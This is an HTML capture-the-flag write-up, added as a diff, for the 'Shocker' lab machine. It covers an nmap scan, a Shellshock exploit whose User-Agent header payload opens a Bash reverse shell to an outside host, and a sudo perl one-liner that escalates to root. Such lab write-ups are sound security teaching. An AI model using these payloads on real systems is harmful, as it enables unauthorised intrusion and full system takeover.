@@ -1,0 +1,80 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Shocker</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
+</head>
+<body>
+  <div class="page">
+    <h1 class="title">Shocker</h1>
+
+    <section>
+      <h2>Reconnaissance</h2>
+      <p>
+        I started by performing a full TCP port scan against the target host to identify exposed services.
+      </p>
+      <pre><code>nmap -Pn -sC -sV -p- --open 10.10.10.56 -oN scan.txt</code></pre>
+      <p>
+        The scan revealed that the SSH and HTTP services were accessible. After visiting the web application,
+        I did not find any interesting functionality or visible attack vectors. Reviewing the page source
+        also did not reveal anything useful.
+      </p>
+      <p>
+        Since the web server was running CGI scripts, I manually inspected the <strong>/cgi-bin/</strong>
+        directory and discovered the script <strong>user.sh</strong>.
+      </p>
+      <img src="images/37-1.png" alt="cgi-bin user.sh">
+    </section>
+
+    <section>
+      <h2>Vulnerability Analysis</h2>
+      <p>
+        Accessing the <strong>user.sh</strong> script triggered a file download. I intercepted the request
+        using Burp Suite and sent it to the Repeater for further analysis. The server processed the request
+        using the <strong>GET</strong> method.
+      </p>
+      <p>
+        Based on the behavior of the CGI script and the server configuration, I identified the presence of
+        the <strong>Shellshock</strong> vulnerability, which allows command execution through crafted HTTP
+        headers.
+      </p>
+      <img src="images/37-2.png" alt="Shellshock vulnerability">
+    </section>
+
+    <section>
+      <h2>Exploitation</h2>
+      <p>
+        To exploit the vulnerability, I injected a malicious payload into the <strong>User-Agent</strong>
+        HTTP header. This payload executed a Bash reverse shell, allowing me to gain remote command execution
+        on the target system.
+      </p>
+      <pre><code>User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0>&1</code></pre>
+      <p>
+        After setting up a listener on my machine, I successfully obtained a reverse shell and was able to
+        read the <strong>user.txt</strong> flag.
+      </p>
+    </section>
+
+    <section>
+      <h2>Privilege Escalation</h2>
+      <p>
+        Once inside the system, I checked the sudo privileges assigned to the compromised user. The output
+        revealed that the <strong>perl</strong> binary could be executed as root without requiring a password.
+      </p>
+      <p>
+        Using a known technique from <strong>GTFOBins</strong>, I leveraged this misconfiguration to spawn
+        a root shell.
+      </p>
+      <pre><code>sudo perl -e 'exec "/bin/sh";'</code></pre>
+      <p>
+        With elevated privileges, I accessed the <strong>root.txt</strong> flag, completing the compromise
+        of the system.
+      </p>
+    </section>
+
+  </div>
+</body>
+
+</html>
